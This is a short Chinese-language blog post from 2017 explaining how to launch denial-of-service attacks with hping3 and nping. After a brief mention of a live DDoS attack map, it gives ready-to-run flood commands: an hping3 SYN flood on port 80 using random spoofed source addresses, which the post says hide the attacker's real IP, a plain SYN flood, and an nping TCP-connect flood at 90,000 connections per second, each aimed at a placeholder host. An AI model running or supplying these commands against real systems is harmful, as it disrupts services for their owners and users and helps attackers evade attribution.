---
title: "使用hping3/nping施行DoS攻击"
categories: [ "安全" ]
tags: [ "网络" ]
draft: false
slug: "使用hping3nping施行DoS攻击-使用hping3nping施行dos攻击"
date: "2017-04-08 17:08:27"
---



DDoS攻击是常见的攻击方式，每小时大约发生28次。<http://www.digitalattackmap.com>提供在世界范围内的DDoS实时攻击分布图：

![][1] 

从DDoS攻击的地图上就可以看出国际形势；例如，到9月18号可以看到日本－中国的攻击；川普宣布建墙之后，可以看到墨西哥－美国的攻击。

使用hping3进行DoS攻击：

    # hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testsite.com

  * -c：发送数据包的个数
  * -d：每个数据包的大小
  * -S：发送SYN数据包
  * -w：TCP window大小
  * -p：目标端口，你可以指定任意端口
  * –flood：尽可能快的发送数据包
  * –rand-source：使用随机的IP地址，目标机器看到一堆ip，不能定位你的实际IP；也可以使用-a或–spoof隐藏主机名

简单的SYN洪水攻击：

    # hping3 -S --flood -V testsite.com

TCP连接攻击：

    # nping --tcp-connect -rate=90000 -c 900000 -q testsite.com

关于这两个工具的更多信息：

    # man hping3
    # man nping

 [1]: /uploads/oss/2017-04-23-14916425220453.png ""